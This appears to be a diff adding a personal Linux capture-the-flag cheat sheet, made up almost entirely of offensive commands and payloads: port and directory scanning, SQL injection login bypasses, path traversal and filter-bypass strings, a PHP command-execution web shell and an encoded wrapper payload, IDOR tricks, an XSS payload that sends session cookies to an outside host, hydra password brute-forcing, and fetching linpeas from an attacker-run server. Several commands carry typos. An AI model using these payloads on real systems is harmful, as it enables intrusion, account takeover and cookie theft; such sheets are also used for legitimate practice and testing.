@@ -1,0 +1,170 @@
+LINUX CTF cheatsheet
+
+
+RECON:
+
+Portscanning{
+# rustscan
+    rustscan -a 192.168.*.* -- -sV -sC -oN nmap/inital      
+# nmap
+    nmap -sC -sV 192,168.*.*  -T4 -oN nmap/intal
+} 
+
+DIRBUSTING{
+    feroxbuster --url  [https://example.com/] -w [path/to/file]
+    gobuster dir -u  [https://example.com/]   -w [path/to/file]
+}
+
+VHOST{
+    gobuster vhost -d domain  --wordlist [path/to/file]
+}
+ subdomain{
+    gobuster vhost --url [https://example.com/] --wordlist [path/to/file]
+ 
+ }
+fuzzing{
+# web fuzzing
+    ffuf -u http://website/FUZZ -w  [path/to/file]
+    
+
+
+}
+
+________________________________________________________________________-
+EXPLOIT:    
+mysql_inject{
+
+# login bypass 
+    admin' --
+    admin' #
+    admin'/*
+    ' or 1=1--
+    ' or 1=1#
+    ' or 1=1/*
+    ') or '1'='1--
+    ') or ('1'='1--
+    #entry point detection
+    '
+    "
+    `
+    ')
+    ")
+    `)
+    '))
+    "))
+    `))
+# comments
+    MySQL
+    #comment
+    -- comment     [Note the space after the double dash]
+    /*comment*/
+    /*! MYSQL Special SQL */
+    PostgreSQL
+    --comment
+    /*comment*/
+    MSQL
+    --comment
+    /*comment*/
+    Oracle
+    --comment
+    SQLite
+    --comment
+    /*comment*/
+}
+
+Local file inclusion{
+# basic php payload
+<?php system($_GET["cmd"]);?>
+# basic lfi 
+    /etc/passwd
+    ../../../../etc/paswd
+# lfi filter bypasses
+    ..//..//..//..//..//etc/passwd
+    .../.../.../.../.../etc/passwd
+    ....//....//....//....//....//etc/passwd
+    ../../../etc/passwd%00
+    ..%2F..%2F..%2F..%2Fetc%2Fpaswd
+    %252e%252e%252fetc%252fpasswd
+    252e%252e%252fetc%252fpasswd%00
+    %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+    %c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00
+# php wrappers
+    php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=whoami
+
+}
+
+
+idor{
+# apis
+     You can use the same parameter several times
+    api.example/profile?UserId=123 # Ok, your profile
+    api.example/profile?UserId=456 # ERROR
+    api.example/profile?UserId=456&UserId=123 # OK, it can work
+    * Tips
+    * - Some encoded/hashed IDs can be predictable --> Create accounts to see
+    * - Try some id, user_id, message_id even if the application seems to not offer it (on API for ex)
+    * - Parameter Polluttion (HPP)
+    * - Switch between POST and PUT to bypass potential controls
+    
+# logins
+    http://web/userID=13333 # your profile
+    http://web/userID=0 probable admin account
+    http://web/userID=999 random high number for error
+}
+
+XXS{
+# basic poc 
+    <script>alert(1);</script>
+# session stealing
+    <script>fetch('https://website.xyz/page?cookie=' + btoa(document.cookie));</script>
+
+}
+
+
+Brute_forceing{
+# ssh
+    hydra -l username -P [path/to/file] ssh://$ip
+# web page
+    burpsuite intruder
+    hyrda -l username -P [path/to/file] http-form (get request from dev tools) 
+
+}
+
+;
+
+
+
+________________________________________________________________________________________________________________________________________________________________________-
+PRIVESC:    
+
+stablise shell{
+    python -c 'import pty; pty.spawn("/bin/bash")'
+    ctrl+z
+    stty raw -echo;fg
+    enter
+    export TERM=xterm
+}
+LOOKING AROUND{
+# find suid binarys
+    find /  -perm -u=s -type f 2>/dev/null
+    find / -perm /4000 2>/dev/null
+    #finding files for specified user
+    find / -type f -user #USER -type f 2>/dev/null
+# finding flags
+    find / -name "*user.txt" -o -name ".flag*" -exec cat {} \; 2>/dev/null 
+    find / -name "*flag.txt" -o -name ".flag*" -exec cat {} \; 2>/dev/null  
+    find / -name ".flag" -o -name "flag" -exec cat {} \; 2>/dev/null 
+# python server 
+    python -m http.server
+# linpeas
+    wget http://urip:8000/linpeas.sh
+    chmod +x linpeas
+    ./linpeas
+# site for known linux lolbins
+    https://gtfobins.github.io/
+
+
+}
+
+
+;
